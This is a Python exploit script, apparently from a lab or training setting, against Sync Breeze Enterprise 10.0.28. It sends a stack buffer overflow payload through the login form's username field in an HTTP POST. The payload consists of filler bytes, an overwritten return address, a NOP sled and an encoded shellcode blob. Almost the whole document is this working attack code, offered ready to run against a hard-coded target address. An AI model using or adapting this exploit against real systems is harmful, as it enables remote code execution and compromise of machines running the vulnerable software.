#!/usr/bin/python
# Author: Robert Taylor
# Exploit for: Sync Breeze Enterprise 10.0.28
# python3 version
import socket

try:
    print("\nSending evil exploit...")
    filler="A" * 780
    eip="\x83\x0c\x09\x10" 
    offset="C" * 4
    nops = "\x90" * 10
    shellcode= ("\xdd\xc0\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x52\xb8\xd6\x47"
"\x42\xec\x31\x45\x17\x03\x45\x17\x83\x3b\xbb\xa0\x19\x3f"
"\xac\xa7\xe2\xbf\x2d\xc8\x6b\x5a\x1c\xc8\x08\x2f\x0f\xf8"
"\x5b\x7d\xbc\x73\x09\x95\x37\xf1\x86\x9a\xf0\xbc\xf0\x95"
"\x01\xec\xc1\xb4\x81\xef\x15\x16\xbb\x3f\x68\x57\xfc\x22"
"\x81\x05\x55\x28\x34\xb9\xd2\x64\x85\x32\xa8\x69\x8d\xa7"
"\x79\x8b\xbc\x76\xf1\xd2\x1e\x79\xd6\x6e\x17\x61\x3b\x4a"
"\xe1\x1a\x8f\x20\xf0\xca\xc1\xc9\x5f\x33\xee\x3b\xa1\x74"
"\xc9\xa3\xd4\x8c\x29\x59\xef\x4b\x53\x85\x7a\x4f\xf3\x4e"
"\xdc\xab\x05\x82\xbb\x38\x09\x6f\xcf\x66\x0e\x6e\x1c\x1d"
"\x2a\xfb\xa3\xf1\xba\xbf\x87\xd5\xe7\x64\xa9\x4c\x42\xca"
"\xd6\x8e\x2d\xb3\x72\xc5\xc0\xa0\x0e\x84\x8c\x05\x23\x36"
"\x4d\x02\x34\x45\x7f\x8d\xee\xc1\x33\x46\x29\x16\x33\x7d"
"\x8d\x88\xca\x7e\xee\x81\x08\x2a\xbe\xb9\xb9\x53\x55\x39"
"\x45\x86\xfa\x69\xe9\x79\xbb\xd9\x49\x2a\x53\x33\x46\x15"
"\x43\x3c\x8c\x3e\xee\xc7\x47\x81\x47\xb0\xea\x69\x9a\x3e"
"\x14\xd1\x13\xd8\x7c\x35\x72\x73\xe9\xac\xdf\x0f\x88\x31"
"\xca\x6a\x8a\xba\xf9\x8b\x45\x4b\x77\x9f\x32\xbb\xc2\xfd"
"\x95\xc4\xf8\x69\x79\x56\x67\x69\xf4\x4b\x30\x3e\x51\xbd"
"\x49\xaa\x4f\xe4\xe3\xc8\x8d\x70\xcb\x48\x4a\x41\xd2\x51"
"\x1f\xfd\xf0\x41\xd9\xfe\xbc\x35\xb5\xa8\x6a\xe3\x73\x03"
"\xdd\x5d\x2a\xf8\xb7\x09\xab\x32\x08\x4f\xb4\x1e\xfe\xaf"
"\x05\xf7\x47\xd0\xaa\x9f\x4f\xa9\xd6\x3f\xaf\x60\x53\x4f"
"\xfa\x28\xf2\xd8\xa3\xb9\x46\x85\x53\x14\x84\xb0\xd7\x9c"
"\x75\x47\xc7\xd5\x70\x03\x4f\x06\x09\x1c\x3a\x28\xbe\x1d"
"\x6f")
   
    inputBuffer = filler + eip + offset + nops + shellcode
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.125.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.125.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("192.168.125.10", 80))
    s.send(buffer.encode("latin1"))
    
    s.close()

    print("\nDone!")
except ValueError as e:
        print("The error was", str(e))
except socket.error as e:
        print("The error was", str(e))


